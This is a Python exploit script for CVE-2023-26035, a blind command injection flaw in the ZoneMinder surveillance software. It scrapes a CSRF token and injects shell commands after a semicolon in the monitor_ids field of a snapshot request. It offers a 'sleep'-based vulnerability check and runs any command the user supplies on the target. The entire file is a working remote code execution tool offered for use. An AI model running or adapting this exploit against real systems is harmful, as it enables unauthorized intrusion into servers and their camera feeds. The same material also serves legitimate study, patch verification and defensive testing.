#!/usr/bin/env python3
#coding: utf-8

import requests
from bs4 import BeautifulSoup
import argparse
import re
import time

"""
This exploit require requests and BeautifulSoup

    python3 -m pip install beautifulsoup4 requests

"""


def check(url):
    sleep_time = 3 # <-- Modify this if you have a shitty connection
    command = f'sleep {sleep_time}'

    # Just a message so we have some output
    host = re.sub('^https?://', '', url) # remove http://
    host = re.sub('(:.*$)?', '', host)    # remove :port/directory
    print(f"\033[1;96m[+]\033[0m Checking if \033[1;95m{host}\033[0m is vulnerable by executing \033[1;96m{command}\033[0m")

    # Try executing `sleep 3` on the target
    start = time.time()
    execute_command(url, command)
    end   = time.time()

    elapsed = end-start

    if elapsed > 3:
        return True

    else:
        return False

def execute_command(url, cmd):
    url = '/'.join([url, 'index.php'])

    try:
        res = requests.get(url)

    except requests.exceptions.ConnectionError as e:
        print(f"\033[1;31m[-]\033[0m Error: could not connect to {url}")
        exit()

    if res.status_code == 404:
        print(f"\033[1;31m[-]\033[0m 404 error for {url}")
        exit()

    if not 'ZoneMinder' in res.text:
        print(f'{url} does not seems to be a ZoneMinder service')
        exit()

    soup = BeautifulSoup(res.text, 'html.parser')
    csrf = soup.input['value']

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    data = f"view=snapshot&action=create&monitor_ids[0][Id]=0;{cmd}&__csrf_magic={csrf}"
    
    try:
        r = requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def main():
    # Argument parsing stuff
    parser = argparse.ArgumentParser(description="Exploit for CVE-2023-26035.", epilog="This is a blind command injection so you won't be able to see the output of the command.")
    
    parser.add_argument('url', type=str, help='URL of the targeted ZoneMinder.')
    parser.add_argument('command', type=str, nargs='?', help='command to execute on the remote machine.')

    args = parser.parse_args()

    # used for messages, so we don't have the scheme in every message
    host = re.sub('^https?://', '', args.url) # remove http://
    host = re.sub('(:.*$)?', '', host)    # remove :port/directory


    # Ensure the URL begin with http://
    if not re.match('^https?://.*', args.url):
        print("\033[1;31m[-]\033[0m URL should start with http or https")
        exit()


    ## If no command is provided, just check if the target is vulnerable
    ## if we have a command, don't run the check, and execute the command

    if not args.command:
        vulnerable = check(args.url)

        if not vulnerable:
            print(f"\033[1;31m[-]\033[0m \033[1;95m{host}\033[0m is \033[1;31mnot vulnerable\033[0m.")
        else:
            print(f"\033[1;92m[+]\033[0m \033[1;92m{host}\033[0m is \033[1;92mvulnerable\033[0m.")

        exit()

    # Just a message so we have some output
    print(f"\033[1;96m[+]\033[0m Executing command \033[1;96m{args.command}\033[0m on \033[1;95m{host}\033[0m")
    print(f"\033[1;96m[+]\033[0m This is a blind command injection, so we can't have the output")

    # execute the command
    execute_command(args.url, args.command)

if __name__ == '__main__':
    main()